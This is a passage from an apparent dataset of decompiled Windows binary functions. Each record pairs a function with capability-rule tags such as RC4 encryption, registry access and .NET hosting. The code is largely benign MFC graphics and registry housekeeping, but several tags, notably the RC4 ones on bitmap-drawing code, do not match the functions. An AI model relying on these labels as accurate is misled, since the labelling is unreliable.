        "decompiled_code": "\ncode ** __fastcall fcn.00420246(code **param_1)\n\n{\n    param_1[5] = NULL;\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    *param_1 = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.2.0;\n    param_1[1] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.1.0;\n    param_1[4] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.0;\n    fcn.00432198();\n    return param_1;\n}\n",
        "token_count": 143
    },
    "00423ce5": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423ce5(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint uStack20;\n    \n    puVar2 = *(param_1 + 4);\n    while( true ) {\n        if (puVar2 == NULL) {\n            *(param_1 + 0xc) = 0;\n            *(param_1 + 0x10) = 0;\n            *(param_1 + 8) = 0;\n            *(param_1 + 4) = 0;\n            fcn.00436366();\n            *(param_1 + 0x14) = 0;\n            return;\n        }\n        if (puVar2 == 0xfffffff8) break;\n        uStack20 = 0x423cfe;\n        fcn.00423c17();\n        puVar2 = *puVar2;\n    }\n    uStack20 = 0x4a8690;\n    fcn.00456b8d(&stack0xffffffec, 0x49ed44);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 255
    },
    "00429ed2": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00429ed2(int32_t param_1)\n\n{\n    uint *puVar1;\n    \n    for (puVar1 = *(param_1 + 4); puVar1 != NULL; puVar1 = *puVar1) {\n    }\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 4) = 0;\n    fcn.00436366();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 142
    },
    "00431721": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00431721(int32_t param_1)\n\n{\n    if (*(param_1 + 4) != 0) {\n        fcn.004170df(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    fcn.00436366();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 119
    },
    "00432336": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00432336(int32_t param_1)\n\n{\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 4) = 0;\n    fcn.00436366();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 100
    },
    "00445bc9": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445bc9(int32_t param_1)\n\n{\n    uint *puVar1;\n    \n    for (puVar1 = *(param_1 + 4); puVar1 != NULL; puVar1 = *puVar1) {\n    }\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 4) = 0;\n    fcn.00436366();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 142
    },
    "0044aca0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.0044aca0(code **param_1, code *param_2, code *param_3, code *param_4, code *param_5)\n\n{\n    fcn.0042207c();\n    *param_1 = vtable.CEnumArray.0;\n    param_1[0xe] = vtable.CEnumArray::XEnumVOID.0;\n    param_1[9] = NULL;\n    param_1[0xb] = NULL;\n    param_1[8] = param_2;\n    param_1[0xc] = param_4;\n    param_1[10] = param_3;\n    param_1[0xd] = param_5;\n    return param_1;\n}\n",
        "token_count": 166
    },
    "00453a06": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00453a06(int32_t param_1, uint32_t *param_2, uint32_t *param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint unaff_retaddr;\n    \n    uVar1 = fcn.004538fd(param_2);\n    *param_3 = uVar1;\n    uVar1 = uVar1 % *(param_1 + 8);\n    *param_2 = uVar1;\n    if (*(param_1 + 4) != 0) {\n        for (puVar3 = *(*(param_1 + 4) + uVar1 * 4); puVar3 != NULL; puVar3 = *puVar3) {\n            if ((puVar3[1] == *param_3) && (iVar2 = fcn.004039d0(unaff_retaddr),  iVar2 == 0)) {\n                return puVar3;\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 231
    },
    "00453ab7": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453ab7(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uStack24;\n    uint uStack20;\n    \n    if (*(param_1 + 4) != 0) {\n        uVar2 = 0;\n        if (*(param_1 + 8) != 0) {\n            do {\n                for (puVar3 = *(*(param_1 + 4) + uVar2 * 4); puVar3 != NULL; puVar3 = *puVar3) {\n                    if (puVar3 == 0xfffffff8) {\n                        uStack20 = 0;\n                        uStack24 = 0x4a8690;\n                        fcn.00456b8d(&stack0xffffffe8, 0x49ed44);\n                        pcVar1 = swi(3);\n                        (*pcVar1)();\n                        return;\n                    }\n                    uStack24 = 0x453ae0;\n                    fcn.00423c17();\n                }\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < *(param_1 + 8));\n        }\n        uStack20 = *(param_1 + 4);\n        uStack24 = 0x453af4;\n        fcn.004170df();\n        *(param_1 + 4) = 0;\n    }\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    uStack20 = 0x453b06;\n    fcn.00436366();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 383
    },
    "0041abee": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: hdc\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_52h\n// WARNING: Variable defined which should be unmapped: lpvObject\n// WARNING: Variable defined which should be unmapped: nWidth\n// WARNING: Variable defined which should be unmapped: nHeight\n\nvoid __cdecl fcn.0041abee(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint lpvObject;\n    uint nWidth;\n    uint nHeight;\n    uint var_52h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint hdc;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(0x58);\n    *(unaff_EBP + -0x3c) = vtable.CDC.0;\n    *(unaff_EBP + -0x38) = 0;\n    *(unaff_EBP + -0x34) = 0;\n    *(unaff_EBP + -0x30) = 0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x4c) = vtable.CDC.0;\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    *(unaff_EBP + -0x40) = 0;\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x1c) = vtable.CBitmap.0;\n    pcVar1 = _sym.imp.USER32.dll_GetSysColor;\n    *(unaff_EBP + -4) = 2;\n    uVar2 = (*pcVar1)(0x14);\n    fcn.0041aafd(uVar2);\n    *(unaff_EBP + -4) = 3;\n    uVar2 = (*pcVar1)(0x10);\n    fcn.0041aafd(uVar2);\n    pcVar1 = _sym.imp.GDI32.dll_CreateCompatibleDC;\n    *(unaff_EBP + -4) = 4;\n    var_18h = (*pcVar1)(0);\n    iVar3 = fcn.0041a288(var_18h);\n    if (iVar3 != 0) {\n        var_18h = (*pcVar1)(0);\n        iVar3 = fcn.0041a288(var_18h);\n        if (iVar3 != 0) {\n            iVar3 = *(unaff_EBP + 8);\n            (*_sym.imp.GDI32.dll_GetObjectA)(*(iVar3 + 4), 0x18, unaff_EBP + -100);\n            fcn.0041a5a2();\n            var_18h = *(unaff_EBP + -0x60);\n            iVar4 = fcn.0041a60b(var_18h, *(unaff_EBP + -0x5c), *(unaff_EBP + -0x54), *(unaff_EBP + -0x52), 0);\n            if (iVar4 != 0) {\n                var_18h = (*_sym.imp.GDI32.dll_CreateBitmap)(*(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), 1, 1, 0);\n                iVar4 = fcn.0041a54f();\n                if (iVar4 != 0) {\n                    uVar2 = fcn.0041a64f(*(unaff_EBP + -0x38), *(iVar3 + 4));\n                    *(unaff_EBP + 8) = uVar2;\n                    var_18h = *(unaff_EBP + -0x48);\n                    iVar3 = fcn.0041a64f(var_18h, *(unaff_EBP + -0x18));\n                    *(unaff_EBP + -0x14) = iVar3;\n                    if ((*(unaff_EBP + 8) != 0) && (iVar3 != 0)) {\n                        uVar2 = (*_sym.imp.GDI32.dll_GetPixel)(*(unaff_EBP + -0x38), 0, 0);\n                        uVar2 = fcn.004192d7(uVar2);\n                        pcVar1 = _sym.imp.GDI32.dll_BitBlt;\n                        *(unaff_EBP + -0x10) = uVar2;\n                        (*pcVar1)(*(unaff_EBP + -0x48), 0, 0, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), \n                                  *(unaff_EBP + -0x38), 0, 0, 0xcc0020);\n                        fcn.004192d7(0xffffff);\n                        (*pcVar1)(*(unaff_EBP + -0x48), 0, 0, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), \n                                  *(unaff_EBP + -0x38), 0, 0, 0x1100a6);\n                        if (*(unaff_EBP + 0xc) == 0) {\n                            uVar2 = 0;\n                        }\n                        else {\n                            uVar2 = *(*(unaff_EBP + 0xc) + 4);\n                        }\n                        iVar3 = fcn.0041a64f(*(unaff_EBP + -0x38), uVar2);\n                        if (iVar3 != 0) {\n                            fcn.0042edf5(0, 0, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), *(unaff_EBP + 0x10));\n                            fcn.004192d7(0xffffff);\n                            uVar2 = fcn.0041a6e8(unaff_EBP + -0x2c);\n                            *(unaff_EBP + 0xc) = uVar2;\n                            (*pcVar1)(*(unaff_EBP + -0x38), 1, 1, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), \n                                      *(unaff_EBP + -0x48), 0, 0, 0xe20746);\n                            fcn.0041a6e8(unaff_EBP + -0x24);\n                            (*pcVar1)(*(unaff_EBP + -0x38), 0, 0, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), \n                                      *(unaff_EBP + -0x48), 0, 0, 0xe20746);\n                            fcn.0041a6e8(*(unaff_EBP + 0xc));\n                            fcn.004192d7(*(unaff_EBP + -0x10));\n                        }\n                        fcn.0041a64f(*(unaff_EBP + -0x48), *(*(unaff_EBP + -0x14) + 4));\n                        var_18h = *(unaff_EBP + -0x38);\n                        fcn.0041a64f(var_18h, *(*(unaff_EBP + 8) + 4));\n                    }\n                }\n            }\n        }\n    }\n    *(unaff_EBP + -4) = 3;\n    *(unaff_EBP + -0x24) = vtable.CGdiObject.0;\n    fcn.0041a5a2(var_18h);\n    *(unaff_EBP + -4) = 2;\n    *(unaff_EBP + -0x2c) = vtable.CGdiObject.0;\n    fcn.0041a5a2();\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x1c) = vtable.CGdiObject.0;\n    fcn.0041a5a2();\n    *(unaff_EBP + -4) = 0;\n    fcn.0041a302();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041a302();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 2161
    },
    "0041b098": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: hDC\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: hdc\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: hbr\n// WARNING: Variable defined which should be unmapped: var_66h\n// WARNING: Variable defined which should be unmapped: lprc\n// WARNING: Variable defined which should be unmapped: var_5ch\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: lpvObject\n// WARNING: Variable defined which should be unmapped: var_74h\n// WARNING: Variable defined which should be unmapped: var_70h\n\nvoid __cdecl fcn.0041b098(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint lpvObject;\n    uint var_74h;\n    uint var_70h;\n    uint var_66h;\n    uint lprc;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint hdc;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint hDC;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint hbr;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(0x6c);\n    *(unaff_EBP + -0x40) = vtable.CDC.0;\n    *(unaff_EBP + -0x3c) = 0;\n    *(unaff_EBP + -0x38) = 0;\n    *(unaff_EBP + -0x34) = 0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x50) = vtable.CDC.0;\n    *(unaff_EBP + -0x4c) = 0;\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    *(unaff_EBP + -0x30) = vtable.CDC.0;\n    *(unaff_EBP + -0x2c) = 0;\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x24) = 0;\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + -0x18) = vtable.CBitmap.0;\n    *(unaff_EBP + -0x1c) = 0;\n    *(unaff_EBP + -0x20) = vtable.CBrush.0;\n    pcVar1 = _sym.imp.GDI32.dll_CreateCompatibleDC;\n    *(unaff_EBP + -4) = 4;\n    uVar2 = (*pcVar1)(0);\n    iVar3 = fcn.0041a288(uVar2);\n    if (iVar3 != 0) {\n        uVar2 = (*pcVar1)(0);\n        iVar3 = fcn.0041a288(uVar2);\n        if (iVar3 != 0) {\n            uVar2 = (*pcVar1)(0);\n            iVar3 = fcn.0041a288(uVar2);\n            if ((iVar3 != 0) &&\n               (iVar3 = (*_sym.imp.GDI32.dll_GetObjectA)(*(*(unaff_EBP + 8) + 4), 0x18, unaff_EBP + -0x78),  iVar3 != 0)\n               ) {\n                fcn.0041a5a2();\n                iVar3 = fcn.0041a60b(*(unaff_EBP + -0x74), *(unaff_EBP + -0x70), *(unaff_EBP + -0x68), \n                                     *(unaff_EBP + -0x66), 0);\n                pcVar1 = _sym.imp.GDI32.dll_CreateBitmap;\n                if (iVar3 != 0) {\n                    uVar2 = (*_sym.imp.GDI32.dll_CreateBitmap)(8, 8, 1, 1, 0x48bb84);\n                    fcn.0041a54f(uVar2);\n                    fcn.0041a5ea(unaff_EBP + -0x18);\n                    fcn.0041a5a2();\n                    (*pcVar1)(*(unaff_EBP + -0x74), *(unaff_EBP + -0x70), 1, 1, 0);\n                    fcn.0041a54f();\n                    uVar2 = fcn.0041a64f(*(unaff_EBP + -0x3c));\n                    *(unaff_EBP + 8) = uVar2;\n                    iVar3 = fcn.0041a64f(*(unaff_EBP + -0x4c), *(unaff_EBP + -0x14));\n                    *(unaff_EBP + -0x10) = iVar3;\n                    if ((*(unaff_EBP + 8) != 0) && (iVar3 != 0)) {\n                        uVar2 = (*_sym.imp.GDI32.dll_GetPixel)(*(unaff_EBP + -0x3c), 0, 0);\n                        fcn.004192d7(uVar2);\n                        pcVar1 = _sym.imp.GDI32.dll_BitBlt;\n                        (*_sym.imp.GDI32.dll_BitBlt)\n                                  (*(unaff_EBP + -0x4c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                   *(unaff_EBP + -0x3c), 0, 0, 0xcc0020);\n                        fcn.004192d7(0xffffff);\n                        (*pcVar1)(*(unaff_EBP + -0x4c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                  *(unaff_EBP + -0x3c), 0, 0, 0xee0086);\n                        fcn.004192d7();\n                        iVar3 = fcn.0041a64f();\n                        *(unaff_EBP + 0xc) = iVar3;\n                        if (iVar3 != 0) {\n                            uVar2 = fcn.004193be();\n                            uVar4 = fcn.004192d7();\n                            *(unaff_EBP + 0x14) = uVar4;\n                            *(unaff_EBP + -0x58) = *(unaff_EBP + -0x74);\n                            *(unaff_EBP + -0x54) = *(unaff_EBP + -0x70);\n                            *(unaff_EBP + -0x60) = 0;\n                            *(unaff_EBP + -0x5c) = 0;\n                            (*_sym.imp.USER32.dll_FillRect)(*(unaff_EBP + -0x2c), unaff_EBP + -0x60);\n                            fcn.004193be(uVar2);\n                            fcn.004192d7(*(unaff_EBP + 0x14));\n                            (*pcVar1)(*(unaff_EBP + -0x2c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                      *(unaff_EBP + -0x3c), 0, 0, 0x660046);\n                            (*pcVar1)(*(unaff_EBP + -0x2c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                      *(unaff_EBP + -0x4c), 0, 0, 0x8800c6);\n                            (*pcVar1)(*(unaff_EBP + -0x2c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                      *(unaff_EBP + -0x3c), 0, 0, 0x660046);\n                        }\n                        fcn.0041a64f();\n                        fcn.0041a64f(*(unaff_EBP + -0x4c));\n                        fcn.0041a64f(*(unaff_EBP + -0x3c), *(*(unaff_EBP + 8) + 4));\n                    }\n                }\n            }\n        }\n    }\n    *(unaff_EBP + -4) = 3;\n    *(unaff_EBP + -0x20) = vtable.CGdiObject.0;\n    fcn.0041a5a2();\n    *(unaff_EBP + -4) = 2;\n    *(unaff_EBP + -0x18) = vtable.CGdiObject.0;\n    fcn.0041a5a2();\n    *(unaff_EBP + -4) = 1;\n    fcn.0041a302();\n    *(unaff_EBP + -4) = 0;\n    fcn.0041a302();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041a302();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 2425
    },
    "0042c94a": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c94a(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if ((arg_ch < arg_10h) || (arg_14h < arg_ch)) {\n        fcn.0042c830(arg_8h, arg_10h, 0, arg_14h, 0, \"%I64u\", 0xf112);\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "0042d20f": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042d20f(uint16_t *arg_8h, uint arg_ch)\n\n{\n    uint *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*arg_8h < 0x76c) {\n        *in_ECX = 0;\n        in_ECX[1] = 0;\n    }\n    else {\n        fcn.0040e9a0(*arg_8h, arg_8h[1], arg_8h[3], arg_8h[4], arg_8h[5], arg_8h[6], arg_ch);\n        *in_ECX = in_ECX;\n        in_ECX[1] = in_ECX;\n    }\n    return;\n}\n",
        "token_count": 170
    },
    "00432f11": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00432f11(uint *param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*param_1);\n    fcn.00432993(*(param_1 + 2), uVar1 & 0xffff);\n    fcn.00432993();\n    fcn.00432d0d(*param_1, uVar1 & 0xffff);\n    return;\n}\n",
        "token_count": 105
    },
    "00426117": {
        "rules": [
            "create or open registry key",
            "contain loop",
            "query or enumerate registry key"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00426117(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack296;\n    uchar *puStack292;\n    int32_t iStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint uStack276;\n    uint uStack272;\n    uint in_stack_fffffef4;\n    \n    uStack272 = 0x18;\n    uStack276 = 0x42613b;\n    fcn.00458e78();\n    puStack280 = *param_2;\n    uStack276 = &stack0xfffffed8;\n    uStack284 = param_1;\n    iStack288 = 0x42615b;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)();\n    if (iVar1 == 0) {\n        while( true ) {\n            iStack288 = 0x104;\n            uStack296 = 0;\n            puStack292 = &stack0xfffffef0;\n            iVar1 = (*_sym.imp.ADVAPI32.dll_RegEnumKeyA)(0);\n            if (iVar1 != 0) break;\n            puStack280 = 0x42618e;\n            uStack276 = &stack0xfffffef0;\n            fcn.00402f40();\n            puStack280 = &stack0xfffffedc;\n            uStack284 = uStack296;\n            uStack276._0_1_ = 1;\n            iStack288 = 0x42619e;\n            iVar1 = fcn.00426117();\n            uStack276 = uStack276._1_3_ << 8;\n            iStack288 = 0x4261b4;\n            fcn.004010d0();\n            if (iVar1 != 0) break;\n            uStack276 = 0xffffffff;\n        }\n        if ((iVar1 == 0x103) || (iVar1 == 0x3f2)) {\n            iStack288 = *param_2;\n            puStack292 = 0x426179;\n            uStack296 = 0x4261f4;\n            (*_sym.imp.ADVAPI32.dll_RegDeleteKeyA)();\n        }\n        iStack288 = uStack296;\n        puStack292 = 0x4261ff;\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n    }\n    *in_FS_OFFSET = uStack284;\n    uStack272 = 0x42621c;\n    fcn.004566a8(in_stack_fffffef4);\n    return;\n}\n",
        "token_count": 575
    },
    "004363f4": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004363f4(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_4h = 0;\n    var_8h = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0x80000001, \"software\", 0, 0x2001f, &var_4h);\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegCreateKeyExA;\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                          (var_4h, *(param_1 + 0x54), 0, 0, 0, 0x2001f, 0, &var_8h, &var_10h);\n        if (iVar2 == 0) {\n            (*pcVar1)(var_8h, *(param_1 + 0x68), 0, 0, 0, 0x2001f, 0, &var_ch, &var_10h);\n        }\n    }\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n    if (var_4h != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n    }\n    if (var_8h != 0) {\n        (*pcVar1)(var_8h);\n    }\n    return var_ch;\n}\n",
        "token_count": 381
    },
    "00436485": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00436485(uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.004363f4();\n    if (iVar1 == 0) {\n        var_4h = 0;\n    }\n    else {\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(iVar1, lpSubKey, 0, 0, 0, 0x2001f, 0, &var_4h, &var_8h);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n    }\n    return var_4h;\n}\n",
        "token_count": 164
    },
    "004399f2": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004399f2(uint hKey, uint arg_ch)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    bool bVar4;\n    uint lpType;\n    uint lpData;\n    uint lpcbData;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar4 = false;\n    var_8h = 0;\n    lpData = fcn.00401940(0x104);\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegOpenKeyA;\n    lpcbData = 0x104;\n    lpType = 0;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000000, \"CLSID\", &var_8h);\n    if (iVar3 == 0) {\n        var_4h = 0;\n        iVar3 = (*pcVar1)(var_8h, hKey, &var_4h);\n        pcVar2 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n        if (iVar3 == 0) {\n            hKey = 0;\n            iVar3 = (*pcVar1)(var_4h, \"InProcServer32\", &hKey);\n            if (iVar3 == 0) {\n                iVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, 0x48a3e2, 0, &lpType, lpData, &lpcbData);\n                bVar4 = iVar3 == 0;\n                (*pcVar2)(hKey);\n            }\n            (*pcVar2)(var_4h);\n        }\n        (*pcVar2)(var_8h);\n    }\n    fcn.00410110(0xffffffff);\n    return bVar4;\n}\n",
        "token_count": 400
    },
    "00453329": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453329(int32_t param_1)\n\n{\n    int32_t iStack8;\n    int32_t iStack4;\n    \n    iStack8 = param_1;\n    iStack4 = param_1;\n    fcn.004531e0();\n    (**(**(param_1 + 0x68) + 0x138))(&iStack8, *(param_1 + 0x40) - *(param_1 + 0x38), 0x42);\n    fcn.00455cfb(*(param_1 + 0x68), *(param_1 + 0x48), *(param_1 + 0x4c), *(param_1 + 0x70) & 0x40 | 0x2004);\n    return;\n}\n",
        "token_count": 177
    },
    "0047fb95": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0047fb95(void)\n\n{\n    *0x4ab1b4 = (*_sym.imp.KERNEL32.dll_CreateFileA)(\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "004170b4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004170b4(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.004582da(param_1);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*0x4a8374 == NULL) break;\n        iVar1 = (**0x4a8374)(param_1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 117
    },
    "00418055": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00418055(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (param_1 == 0) {\n        return;\n    }\n    if (param_1 == 0xc) {\n        uVar1 = 0x8007000e;\n    }\n    else {\n        if (param_1 == 0x16) goto code_r0x0041807b;\n        if (param_1 == 0x22) goto code_r0x0041807b;\n        if (param_1 == 0x50) {\n            return;\n        }\n        uVar1 = 0x80004005;\n    }\n    do {\n        fcn.00401070(uVar1);\ncode_r0x0041807b:\n        uVar1 = 0x80070057;\n    } while( true );\n}\n",
        "token_count": 187
    },
    "0041cee3": {
        "rules": [
            "contain loop"
        ],
